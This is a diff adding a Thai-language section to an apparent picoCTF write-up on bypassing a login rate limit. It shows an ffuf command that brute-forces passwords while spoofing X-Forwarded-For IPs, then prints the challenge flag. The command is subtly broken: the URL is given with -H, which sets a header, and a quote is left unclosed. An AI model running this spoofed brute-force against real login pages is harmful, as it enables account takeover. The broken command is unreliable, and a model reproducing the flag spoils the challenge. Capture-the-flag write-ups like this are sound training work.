@@ -27,3 +27,22 @@ curl -i "http://amiable-citadel.picoctf.net:57852/login" \
   -H "X-Forwarded-For: 127.0.0.1" \
   -d '{"email":"ctf-player@picoctf.org","password":"test"}'
 ```
+
+ถ้าใช้ ffuf ส่งก็จะเป็น
+```
+ffuf -H "http://amiable-citadel.picoctf.net:57852/login" \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -H "X-Forwarded-For: RANDOMIP" \
+  -d '{"email":"ctf-player@picoctf.org","password":"PASSWORD"} \
+  -w PASSWORD:passwords.txt \
+  -w RANDOMIP:randomip.txt \
+  -mode pitchfork \
+  -mc all
+```
+โดยให้ randomip.txt เป็นไฟล์ที่มีไอพีแบบสุ่มจำนวนเท่ากับ passwords โดยจะใช้ mode pitchfork เพื่อให้ส่งข้อมูลเป็นคู่กัน
+
+จากนั้นจะได้ข้อมูลการส่งทั้งหมด และดูว่าพาสเวิร์ดอันไหนที่ Responses Code 200 OKAY 
+จากนั้นเอาพาสเวิร์ดนั้นไปใส่ในเว็บจริง จะได้ flag **picoCTF{xff_byp4ss_brut3_1c447e47}**
+
+แหล่งอ้างอิง: https://medium.com/@may.hack/crack-the-gate-2-picoctf-writeup-3fe35153dad3
